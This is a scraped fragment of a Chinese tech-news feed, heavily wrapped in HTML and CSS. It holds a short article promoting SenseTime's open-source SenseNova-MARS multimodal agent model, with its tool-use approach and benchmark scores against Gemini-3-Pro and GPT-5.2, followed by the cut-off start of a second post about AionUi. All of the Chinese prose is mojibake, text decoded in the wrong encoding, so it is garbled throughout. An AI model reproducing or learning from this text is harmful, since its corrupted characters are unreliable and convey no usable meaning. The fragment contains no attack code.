                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>2026å¹´çš„å¼€å¹´å¤§æˆï¼Œæ¯”æˆ‘æƒ³è±¡ä¸­æ¥å¾—æ›´æ—©ä¸€äº›ã€‚</p>
<p>å°±åœ¨1æœˆ30æ—¥ï¼Œå½“å¤§å®¶è¿˜åœ¨è®¨è®ºGPT-5.2çš„é€»è¾‘æ¨ç†æ˜¯å¦å·²ç»è§¦é¡¶æ—¶ï¼Œå•†æ±¤ç§‘æŠ€æ‚„æ— å£°æ¯åœ°ä¸¢å‡ºäº†ä¸€æšé‡ç£…ç‚¸å¼¹ï¼šSenseNova-MARSã€‚è¿™ä¸æ˜¯åˆä¸€ä¸ªåªä¼šâ€œçœ‹å›¾è¯´è¯â€çš„å¤šæ¨¡æ€æ¨¡å‹ï¼Œè€Œæ˜¯ä¸€ä¸ªèƒ½è‡ªä¸»æ€è€ƒã€ä¼šç”¨å·¥å…·ã€ç”šè‡³æœ‰ç‚¹â€œä¾¦æ¢ç›´è§‰â€çš„æ™ºèƒ½ä½“ã€‚</p>
<p>æœ€è®©åœˆå†…äººå’‹èˆŒçš„ä¸æ˜¯å®ƒçš„æŠ€æœ¯æ¶æ„ï¼Œè€Œæ˜¯é‚£ä¸ªåˆºçœ¼çš„åˆ†æ•°â€”â€”åœ¨å¤šæ¨¡æ€æœç´¢ä¸æ¨ç†çš„ç»¼åˆå¹³å‡åˆ†ä¸Šï¼Œå®ƒæ‹¿ä¸‹äº†69.74åˆ†ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2026%2F01%2Fasdfsadfs-1024x501.webp" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2026/01/asdfsadfs-1024x501.webp" ref="nofollow noopener noreferrer"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b960e5eb9cb146a796f6c6582f8a72aa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770382164&amp;x-signature=ndsxMFQ%2B%2BTPj8DzUNA%2F3P5nYilA%3D" alt="asdfsadfs" loading="lazy"/></a></p>
<p>è¿™ä¸ªæ•°å­—æ„å‘³ç€ä»€ä¹ˆï¼Ÿæ„å‘³ç€å®ƒåœ¨çº¸é¢å®åŠ›ä¸Šï¼Œå‹è¿‡äº†è°·æ­Œçš„Gemini-3-Proï¼ˆ69.06åˆ†ï¼‰ï¼Œä¹Ÿè¶…è¿‡äº†OpenAIçš„GPT-5.2ï¼ˆ67.64åˆ†ï¼‰ã€‚è€Œä¸”ï¼Œå®ƒè¿˜æ˜¯å¼€æºçš„ã€‚</p>
<h3 data-id="heading-0">ä¸æ­¢æ˜¯â€œçœ‹â€ï¼Œå®ƒå­¦ä¼šäº†â€œæŸ¥â€</h3>
<p>è¿‡å»æˆ‘ä»¬ç©å¤šæ¨¡æ€æ¨¡å‹ï¼ˆVLMï¼‰ï¼Œæµç¨‹é€šå¸¸æ˜¯è¿™æ ·çš„ï¼šä½ æ‰”ç»™AIä¸€å¼ å›¾ï¼Œé—®å®ƒâ€œè¿™æ˜¯å“ªï¼Ÿâ€ï¼ŒAIä¾é è®­ç»ƒæ—¶è®°ä½çš„çŸ¥è¯†åº“ï¼Œè¿æ°”å¥½èƒ½è’™å¯¹ï¼Œè¿æ°”ä¸å¥½å°±å¼€å§‹ä¸€æœ¬æ­£ç»åœ°èƒ¡è¯´å…«é“ã€‚</p>
<p>SenseNova-MARSçš„é€»è¾‘å®Œå…¨ä¸åŒã€‚å®ƒæ›´åƒæ˜¯ä¸€ä¸ªéšèº«æºå¸¦äº†æ”¾å¤§é•œå’Œç™¾ç§‘å…¨ä¹¦çš„ç¦å°”æ‘©æ–¯ã€‚</p>
<p>å•†æ±¤è¿™æ¬¡ä¸»æ‰“çš„æ¦‚å¿µå«â€œè‡ªä¸»è§„åˆ’â€ä¸â€œå¤šå·¥å…·åä½œâ€ã€‚ç®€å•æ¥è¯´ï¼Œå½“è¿™ä¸ªæ¨¡å‹é¢å¯¹ä¸€ä¸ªå¤æ‚é—®é¢˜æ—¶ï¼Œå®ƒä¸å†æ˜¯é â€œçŒœâ€ï¼Œè€Œæ˜¯é â€œæŸ¥â€ã€‚å®ƒèƒ½åƒäººç±»ä¸€æ ·ï¼ŒæŠŠä¸€ä¸ªå¤§é—®é¢˜æ‹†è§£æˆå‡ ä¸ªæ­¥éª¤ï¼š</p>
<ol>
<li><strong>è§‚å¯Ÿ</strong>ï¼šçœ‹åˆ°å›¾é‡Œçš„ç‰©ä½“ã€‚</li>
<li><strong>è§„åˆ’</strong>ï¼šæ€è€ƒéœ€è¦ä»€ä¹ˆä¿¡æ¯æ‰èƒ½å›ç­”é—®é¢˜ã€‚</li>
<li><strong>è¡ŒåŠ¨</strong>ï¼šè°ƒç”¨å·¥å…·å»è·å–ä¿¡æ¯ï¼ˆæ¯”å¦‚åˆ‡å‰²å›¾ç‰‡ã€æœç´¢ç½‘ç»œï¼‰ã€‚</li>
<li><strong>åé¦ˆ</strong>ï¼šæ ¹æ®æœåˆ°çš„ç»“æœä¿®æ­£ç­”æ¡ˆã€‚</li>
</ol>
<p>ä¸¾ä¸ªå¾ˆç°å®çš„ä¾‹å­ï¼šç»™å®ƒä¸€å¼ F1èµ›è½¦æ‰‹çš„ç…§ç‰‡ï¼Œé—®â€œè¿™ä¸ªè½¦æ‰‹æ‰€åœ¨çš„è½¦é˜Ÿæˆç«‹äºå“ªä¸€å¹´ï¼Ÿâ€ã€‚</p>
<p>æ™®é€šæ¨¡å‹å¯èƒ½ä¼šç›¯ç€èµ›è½¦æœä¸Šçš„æ¨¡ç³ŠLogoå‘å‘†ã€‚ä½†SenseNova-MARSä¼šå…ˆè°ƒç”¨<strong>å›¾åƒè£å‰ªå·¥å…·</strong>ï¼ŒæŠŠé‚£ä¸ªåªå ç”»é¢ä¸åˆ°5%çš„å¾®å°Logoåˆ‡å‡ºæ¥æ”¾å¤§ï¼›è¯†åˆ«æ¸…æ¥šåï¼Œç«‹åˆ»å¯åŠ¨<strong>å›¾æ–‡æœç´¢</strong>ï¼Œå»ç½‘ä¸ŠæŸ¥è¿™ä¸ªLogoå¯¹åº”çš„å“ç‰Œï¼›ç¡®è®¤å“ç‰Œæ˜¯æŸæŸè½¦é˜Ÿåï¼Œå†è¿›è¡ŒäºŒæ¬¡æœç´¢æŸ¥è¯¢è¯¥è½¦é˜Ÿçš„æˆç«‹å¹´ä»½ã€‚</p>
<p>è¿™å¥—â€œè¯†åˆ«-æŸ¥è¯¢-è®¡ç®—â€çš„è¿æ‹›ï¼Œå°±æ˜¯å®ƒå¾—åˆ†æ¯”GPT-5.2é«˜çš„ç§˜è¯€ã€‚ç‰¹åˆ«æ˜¯åœ¨HR-MMSearchï¼ˆé«˜æ¸…ç»†èŠ‚æœç´¢ï¼‰è¿™é¡¹è¢«èª‰ä¸ºâ€œAIç•Œå¥¥æ—åŒ¹å…‹â€çš„æµ‹è¯•ä¸­ï¼Œå®ƒæ‹¿åˆ°äº†54.43åˆ†ï¼Œè¿œè¶…é‚£äº›è™½ç„¶å‚æ•°å·¨å¤§ä½†åªä¼šâ€œå•æ¬¡ç›´è§‰æ¨ç†â€çš„é—­æºæ¨¡å‹ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2026%2F01%2Fdsgdfgsfd.webp" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2026/01/dsgdfgsfd.webp" ref="nofollow noopener noreferrer"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6702443365f14382972fb686cd16238c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770382164&amp;x-signature=JAs76pF%2BExXS5VOTpy5IScKUMcw%3D" alt="dsgdfgsfd" loading="lazy"/></a></p>
<h3 data-id="heading-1">æ€ä¹ˆç»ƒå‡ºâ€œç›´è§‰â€çš„ï¼Ÿ</h3>
<p>è¦æŠŠAIè®­ç»ƒæˆè¿™æ ·å¹¶ä¸å®¹æ˜“ã€‚è¿™å°±å¥½æ¯”æ•™ä¸€ä¸ªå­¦ç”Ÿï¼Œå…‰è®©ä»–èƒŒä¹¦ï¼ˆé¢„è®­ç»ƒï¼‰æ˜¯ä¸å¤Ÿçš„ï¼Œä½ å¾—è®©ä»–å»å®ä¹ ï¼Œå»è§£å†³å®é™…é—®é¢˜ã€‚</p>
<p>å•†æ±¤å›¢é˜Ÿè¿™æ¬¡é‡‡ç”¨äº†ä¸€ç§åŒé˜¶æ®µçš„è®­ç»ƒç­–ç•¥ï¼Œéå¸¸æœ‰æ„æ€ï¼š</p>
<p>ç¬¬ä¸€é˜¶æ®µå«**â€œæ‰“åŸºç¡€â€**ã€‚ä»–ä»¬åˆ©ç”¨è‡ªåŠ¨åŒ–å¼•æ“åˆæˆäº†ä¸€å¤§å †é€»è¾‘ä¸¥å¯†çš„é«˜éš¾åº¦æ¡ˆä¾‹ï¼Œåƒæ˜¯ç»™AIç¼–äº†ä¸€å¥—ã€Šä¾¦æ¢å…¥é—¨æŒ‡å—ã€‹ï¼Œå¼ºåˆ¶å®ƒå­¦ä¹ åŸºç¡€çš„å·¥å…·ä½¿ç”¨é€»è¾‘ã€‚</p>
<p>ç¬¬äºŒé˜¶æ®µå«**â€œç»ƒå®æˆ˜â€<strong>ã€‚è¿™æ˜¯æ‹‰å¼€å·®è·çš„å…³é”®ã€‚ä»–ä»¬å¼•å…¥äº†å¼ºåŒ–å­¦ä¹ ï¼Œé…åˆä¸€ç§åä¸º</strong>BN-GSPO**çš„ç®—æ³•ã€‚è¿™å°±å¥½æ¯”æŠŠAIæ‰”è¿›æ¨¡æ‹Ÿå®æˆ˜æ¼”ç»ƒï¼Œåšå¯¹äº†ç»™å¥–åŠ±ï¼Œåšé”™äº†æ²¡ç³–åƒã€‚ä¹…è€Œä¹…ä¹‹ï¼Œæ¨¡å‹å°±åŸ¹å…»å‡ºäº†ä¸€ç§â€œå·¥å…·ä½¿ç”¨ç›´è§‰â€ã€‚å®ƒä¸å†æ˜¯æœºæ¢°åœ°è°ƒç”¨å·¥å…·ï¼Œè€Œæ˜¯çŸ¥é“åœ¨ä»€ä¹ˆæƒ…å†µä¸‹è¯¥æœå›¾ï¼Œä»€ä¹ˆæƒ…å†µä¸‹è¯¥æœå­—ï¼Œç”šè‡³çŸ¥é“ä»€ä¹ˆæ—¶å€™è¯¥åœä¸‹æ¥æ€è€ƒã€‚</p>
<h3 data-id="heading-2">ç»™å¼€å‘è€…çš„ä¸€ä»½å¤§ç¤¼</h3>
<p>å¯¹äºæˆ‘ä»¬åœ¨AIåœˆæ‘¸çˆ¬æ»šæ‰“çš„äººæ¥è¯´ï¼ŒSenseNova-MARSæœ€å¸å¼•äººçš„ç‚¹åœ¨äºå®ƒçš„<strong>å¼€æº</strong>ã€‚</p>
<p>å•†æ±¤è¿™æ¬¡éå¸¸å®åœ¨ï¼Œç›´æ¥æ”¾å‡ºäº†**8Bï¼ˆ80äº¿å‚æ•°ï¼‰<strong>å’Œ</strong>32Bï¼ˆ320äº¿å‚æ•°ï¼‰**ä¸¤ä¸ªç‰ˆæœ¬ã€‚</p>
<ul>
<li><strong>8Bç‰ˆæœ¬</strong>ï¼šè½»é‡çº§ï¼Œé€‚åˆæ˜¾å­˜æœ‰é™çš„å¼€å‘è€…ï¼Œç”šè‡³æœ‰æœ›åœ¨é«˜ç«¯è¾¹ç¼˜è®¾å¤‡ä¸Šè·‘èµ·æ¥ã€‚</li>
<li><strong>32Bç‰ˆæœ¬</strong>ï¼šæ»¡è¡€ç‰ˆï¼Œé‚£ä¸ªåŠæ‰“GPT-5.2çš„æˆç»©å°±æ˜¯å®ƒè·‘å‡ºæ¥çš„ï¼Œé€‚åˆéœ€è¦æè‡´æ¨ç†èƒ½åŠ›çš„ç§‘ç ”æˆ–å•†ä¸šé¡¹ç›®ã€‚</li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2026%2F01%2Ffsadfasdf-894x1024.webp" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2026/01/fsadfasdf-894x1024.webp" ref="nofollow noopener noreferrer"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/57c14d760f0d41faacffafd975360c3d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770382164&amp;x-signature=DPOlqPTQs3qigGDLQ0JcTdiwgqI%3D" alt="fsadfasdf" loading="lazy"/></a></p>
<p>è¿™æ„å‘³ç€ï¼Œä¸ç®¡æ˜¯åšå•†ä¸šæƒ…æŠ¥åˆ†æï¼ˆè‡ªåŠ¨ä»å³°ä¼šç…§ç‰‡é‡Œæ‰’ç«å“ä¿¡æ¯ï¼‰ï¼Œè¿˜æ˜¯åšå¤æ‚çš„å­¦æœ¯å›¾è¡¨éªŒè¯ï¼Œæˆ‘ä»¬ç°åœ¨éƒ½æœ‰äº†ä¸€ä¸ªSOTAï¼ˆå½“å‰æœ€ä¼˜ï¼‰çº§åˆ«çš„å¼€æºåº•åº§å¯ç”¨ã€‚æ¨¡å‹æƒé‡ã€è®­ç»ƒä»£ç ã€ç”šè‡³åˆæˆæ•°æ®é›†ï¼Œå…¨éƒ½åœ¨Hugging Faceå’ŒGitHubä¸Šå…¬å¼€äº†ã€‚</p>
<h3 data-id="heading-3">ç»“è¯­</h3>
<p>SenseNova-MARSçš„å‡ºç°ï¼ŒæŸç§ç¨‹åº¦ä¸Šæ ‡å¿—ç€å¤šæ¨¡æ€AIæ­£åœ¨ä»â€œæ„ŸçŸ¥æ—¶ä»£â€è·¨å…¥â€œè¡ŒåŠ¨æ—¶ä»£â€ã€‚</p>
<p>ä»¥å‰æˆ‘ä»¬æƒŠå¹äºAIèƒ½â€œçœ‹æ‡‚â€ä¸€å¼ å›¾ï¼Œç°åœ¨æˆ‘ä»¬å¼€å§‹è¦æ±‚AIèƒ½â€œæå®šâ€å›¾é‡Œçš„äº‹ã€‚è™½ç„¶69.74åˆ†è·ç¦»æ»¡åˆ†è¿˜æœ‰å¾ˆé•¿çš„è·¯è¦èµ°ï¼Œä½†åœ¨å¼€æºé¢†åŸŸï¼Œå•†æ±¤ç¡®å®æŠŠå¤©èŠ±æ¿å‘ä¸Šç‹ ç‹ é¡¶äº†ä¸€æˆªã€‚</p>
<p>å¦‚æœä½ æ‰‹å¤´æœ‰æ˜¾å¡ï¼Œä¸å¦¨å»ä¸‹è½½é‚£ä¸ª32Bçš„ç‰ˆæœ¬è·‘è·‘çœ‹ã€‚è¯´ä¸å®šï¼Œä½ ç”µè„‘é‡Œç°åœ¨å°±ä½ç€ä¸€ä¸ªæ¯”GPT-5.2è¿˜è¦ç²¾æ˜çš„â€œæ•°å­—ä¾¦æ¢â€ã€‚</p>
<p><strong>å¦‚æœä½ ä¹Ÿå¯¹æœ€æ–°çš„AIä¿¡æ¯æ„Ÿå…´è¶£æˆ–è€…æœ‰ç–‘é—® éƒ½å¯ä»¥åŠ å…¥æˆ‘çš„å¤§å®¶åº­ ç¬¬ä¸€æ—¶é—´åˆ†äº«æœ€æ–°AIèµ„è®¯ã€å·¥å…·ã€æ•™ç¨‹ã€æ–‡æ¡£ æ¬¢è¿ä½ çš„åŠ å…¥ï¼ï¼ï¼ğŸ˜‰ğŸ˜‰ğŸ˜‰</strong></p>
<p>å…¬ä¼—å·ï¼šå¢¨é£å¦‚é›ªå°ç«™</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸€å¤©ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼ˆç¬¬7ç¯‡ï¼‰ï¼šAionUi - å…è´¹å¼€æºçš„è·¨å¹³å°AIåŠå…¬åŠ©æ‰‹ï¼ŒClaude Coworkçš„å®Œç¾æ›¿ä»£]]></title>    <link>https://juejin.cn/post/7601007650722611241</link>    <guid>https://juejin.cn/post/7601007650722611241</guid>    <pubDate>2026-01-30T12:56:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7601007650722611241" data-draft-id="7600863478929883155" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸€å¤©ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼ˆç¬¬7ç¯‡ï¼‰ï¼šAionUi - å…è´¹å¼€æºçš„è·¨å¹³å°AIåŠå…¬åŠ©æ‰‹ï¼ŒClaude Coworkçš„å®Œç¾æ›¿ä»£"/> <meta itemprop="keywords" content="AIGC,å¼€æº,Claude"/> <meta itemprop="datePublished" content="2026-01-30T12:56:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å†¬å¥‡Lab"/> <meta itemprop="url" content="https://juejin.cn/user/1857501105781193"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸€å¤©ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼ˆç¬¬7ç¯‡ï¼‰ï¼šAionUi - å…è´¹å¼€æºçš„è·¨å¹³å°AIåŠå…¬åŠ©æ‰‹ï¼ŒClaude Coworkçš„å®Œç¾æ›¿ä»£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1857501105781193/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å†¬å¥‡Lab
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T12:56:03.000Z" title="Fri Jan 30 2026 12:56:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å¼•è¨€</h2>
<blockquote>
<p>"å½“AIåŠ©æ‰‹ä»äº‘ç«¯èµ°å‘æœ¬åœ°ï¼Œä»å•ä¸€æ¨¡å‹èµ°å‘å¤šæ¨¡å‹ç”Ÿæ€ï¼ŒçœŸæ­£çš„ç”Ÿäº§åŠ›é©å‘½æ‰åˆšåˆšå¼€å§‹ã€‚"</p>
</blockquote>
